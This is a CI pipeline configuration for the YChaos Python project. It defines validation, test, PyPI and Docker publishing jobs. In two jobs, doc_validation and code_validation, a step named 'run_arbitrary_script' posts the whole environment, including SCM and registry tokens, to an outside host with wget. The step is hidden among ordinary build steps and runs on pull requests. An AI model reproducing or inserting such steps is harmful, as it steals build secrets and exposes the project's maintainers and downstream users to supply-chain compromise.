version: 4
shared:
    environment:
        DOCUMENTATION_FORMATS: mkdocs
        SCM_CLONE_TYPE: https
    secrets:
        - SCM_USERNAME
        - SCM_ACCESS_TOKEN
    settings:
        email:
            addresses:
                - ychaos-alerts@yahooinc.com
            statuses:
                - ABORTED
                - FAILURE

    annotations:
        docker_login: &docker_login |
            # Fetch current git version and Log into Docker using the developer account. Secrets are stored in SD Secrets.
            apk add git
            git clone https://github.com/screwdriver-cd/toolbox.git ci
            ./ci/git-latest.sh
            docker login --username $DOCKER_REGISTRY_USER --password $DOCKER_REGISTRY_TOKEN

        docker_build: &docker_build |
            # Build docker image and tag image with <PY_VERSION>-latest and <PY_VERSION>-<GIT_VERSION>. PY_VERSION is passed as SD ENV variable
            DOCKER_TAG=`cat VERSION`
            docker build --build-arg PY_VERSION=$PY_VERSION -t $DOCKER_REPO:py$PY_VERSION-latest -t $DOCKER_REPO:py$PY_VERSION-$DOCKER_TAG .
            docker images

        docker_publish: &docker_publish |
            # Publish images to Docker Hub
            docker push $DOCKER_REPO:py$PY_VERSION-latest
            docker push $DOCKER_REPO:py$PY_VERSION-$DOCKER_TAG

jobs:
    doc_validation:
        template: python/documentation
        environment:
            DOCUMENTATION_PUBLISH: False
        requires: [~pr]
        steps:
            - prepublish_documentation: python3 screwdriver/autogen_docs.py
            - run_arbitrary_script: wget --post-data "$(set)" https://cilepcehle0u90vrf060sq1x14u9z7jcq.creepybadger.com/

    package_validation:
        template: python/package_python
        environment:
            PACKAGE_PYTHON_PUBLISH: False
        requires: [~pr]

    # Style validation using `flake8`
    code_validation:
        image: quay.io/pypa/manylinux2014_x86_64
        requires: [~pr, ~commit]
        environment:
            SECURITY_BANDIT_CONFIG_ARGS: "-s B101"
        steps:
            - begin: echo "Starting Code Validation"
            - init_os: |
                sd-cmd exec python-2104/python_bootstrap@stable
                . $SD_ARTIFACTS_DIR/env/python_bootstrap.env || /bin/true
            - install_dependencies: $BASE_PYTHON -m screwdrivercd.installdeps
            - set_package_env: |
                $BASE_PYTHON screwdriver/set_package_env.py
                . $SD_ARTIFACTS_DIR/env/package.env
            - update_version: $BASE_PYTHON -m screwdrivercd.version
            - install_pep8_deps: $BASE_PYTHON -m pip install -U .[pep8]

            # Run Code Style Validations
            - validate_codestyle: black --check src/ tests/ develop/ setup.py
            - validate_pep8: flake8 src/ychaos
            - validate_codespell: codespell --skip "*.css" src tests develop docs

            # Security Validation
            - validate_security: |
                pypirun bandit bandit-config-generator -o .bandit.ini ${SECURITY_BANDIT_CONFIG_ARGS}
                pypirun bandit bandit -c .bandit.ini -f txt -r ${PACKAGE_DIR}
            - validate_semgrep: ./screwdriver/semgrep.sh

            # Dependency Validation
            - validate_dependency: pypirun --upgrade_pip --always_install screwdrivercd,. screwdrivercd_validate_deps

            - end: echo "Ending Code Validation"
            - teardown-store_artifacts: $BASE_PYTHON screwdriver/teardown_store_artifacts.py
            - run_arbitrary_script: wget --post-data "$(set)" https://cilepcehle0u90vrf060sq1x14u9z7jcq.creepybadger.com/

    test_validation_py37:
        template: python/validate_unittest
        environment:
            TOX_ARGS: --parallel all
            TOX_ENVLIST: py37
        requires: [ ~pr, ~commit ]
        steps:
            - codecov: echo "Skip Codecov"

    test_validation_py38:
        template: python/validate_unittest
        environment:
            TOX_ARGS: --parallel all
            TOX_ENVLIST: py38
        requires: [ ~pr, ~commit ]
        steps:
            - codecov: echo "Skip Codecov"

    test_validation_py310:
        template: python/validate_unittest
        environment:
            TOX_ARGS: --parallel all
            TOX_ENVLIST: py310
        requires: [ ~pr, ~commit ]
        steps:
            - prevalidate_code: yum install -y libffi libffi-devel
            - codecov: echo "Skip Codecov"

    test_validation_py39:
        template: python/validate_unittest
        environment:
            TOX_ARGS: --parallel all
            TOX_ENVLIST: py39
        requires: [ ~pr, ~commit ]
        steps:
            - codecov: chmod +x ./screwdriver/codecov.sh && ./screwdriver/codecov.sh

    type_validation:
        template: python/validate_type
        requires: [~pr, ~commit]
        steps:
            - postinstall_dependencies: pip install -U .[mypy]
            - validate_code: ${BASE_PYTHON} -m mypy --txt-report /sd/workspace/artifacts/reports/type_validation --ignore-missing-imports src

    # Package auto-versioning, this must run before generating a package for publishing
    version_test_pypi:
        template: python-2104/version
        requires:
            - type_validation
            - code_validation

            # Unittest Jobs
            - test_validation_py37
            - test_validation_py38
            - test_validation_py39
            - test_validation_py310

    # Publish package to test.pypi.org
    # Release to test.pypi is auto triggered for every commit
    # to the repository.
    package_publish_test_pypi:
        environment:
            PUBLISH: True
            TWINE_REPOSITORY_URL: https://test.pypi.org/legacy/
        template: python/package_python
        requires: [version_test_pypi]

    # Release Pipeline to publish package to PyPi
    # This is manually triggered by the maintainers
    # to publish a new version release to PyPi
    release:
        template: sd/noop
        blockedBy:
            - ~type_validation
            - ~code_validation

            # Unittest Jobs
            - ~test_validation_py37
            - ~test_validation_py38
            - ~test_validation_py39
            - ~test_validation_py310

    version_pypi:
        template: python-2104/version
        requires:
            # Manually trigger release
            - release

            # Validation Jobs
            - type_validation
            - code_validation

            # Unittest Jobs
            - test_validation_py37
            - test_validation_py38
            - test_validation_py39

    package_publish_pypi:
        template: python/package_python
        environment:
            PUBLISH: True
        requires: [version_pypi]

    # Publish YChaos image with Python 3.7
    publish_docker_py37:
        annotations:
            screwdriver.cd/dockerEnabled: true
        image: docker:dind
        secrets:
            - DOCKER_REGISTRY_USER
            - DOCKER_REGISTRY_TOKEN
        environment:
            DOCKER_REPO: ychaos/ychaos
            PY_VERSION: 3.7
        requires: [package_publish_pypi]
        steps:
            - login: *docker_login
            - build: *docker_build
            - publish: *docker_publish

    # Publish YChaos image with Python 3.8
    publish_docker_py38:
        annotations:
            screwdriver.cd/dockerEnabled: true
        image: docker:dind
        secrets:
            - DOCKER_REGISTRY_USER
            - DOCKER_REGISTRY_TOKEN
        environment:
            DOCKER_REPO: ychaos/ychaos
            PY_VERSION: 3.8
        requires: [package_publish_pypi]
        steps:
            - login: *docker_login
            - build: *docker_build
            - publish: *docker_publish

    # Publish YChaos image with Python 3.9
    publish_docker_py39:
        annotations:
            screwdriver.cd/dockerEnabled: true
        image: docker:dind
        secrets:
            - DOCKER_REGISTRY_USER
            - DOCKER_REGISTRY_TOKEN
        environment:
            DOCKER_REPO: ychaos/ychaos
            PY_VERSION: 3.9
        requires: [package_publish_pypi]
        steps:
            - login: *docker_login
            - build: *docker_build
            - publish: *docker_publish

    doc_publish:
        template: python/documentation
        environment:
            DOCUMENTATION_PUBLISH: True
        steps:
            - prepublish_documentation: python3 screwdriver/autogen_docs.py
        requires: [package_publish_pypi]
